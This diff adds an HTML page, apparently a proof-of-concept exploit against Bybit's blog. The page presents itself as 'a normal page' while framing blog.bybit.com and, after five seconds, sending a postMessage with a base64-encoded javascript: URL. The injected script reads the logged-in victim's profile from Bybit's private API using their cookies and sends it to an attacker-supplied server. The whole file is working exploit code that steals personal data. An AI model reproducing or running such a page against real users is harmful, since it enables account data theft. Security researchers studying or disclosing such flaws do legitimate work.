@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <h1>Hi this is a normal page</h1>
+
+    <iframe
+      id="iframe2"
+      src="https://blog.bybit.com/?sa-visual-mode=true"
+      name='{"sa-visual-mode":true}'
+    ></iframe>
+
+    <script>
+      let attackerServer = new URLSearchParams(location.search).get(
+        "attackerServer"
+      );
+      let payload = `var PII;
+      fetch('https://api2.bybit.com/v2/private/user/profile',{method:'get',credentials: 'include',  headers:{'Content-Type':'application/json'}})
+        .then((response) => response.json())
+        .then((x) => {
+          PII = JSON.stringify(x);
+          fetch("${attackerServer}?userPII="+PII); 
+          });`;
+
+      let payload64 = btoa(payload);
+
+      function sendMessage() {
+        iframe2.contentWindow.postMessage(
+          {
+            source: "sa-fe",
+            data: {
+              isVtrack: 1,
+              userURL: "javascript:javascript:eval(atob('" + payload64 + "'))",
+            },
+            type: "v-track-mode",
+          },
+          "*"
+        );
+      }
+
+      iframe2.onload = function () {
+        setTimeout(sendMessage, 5000);
+      };
+    </script>
+  </body>
+</html>
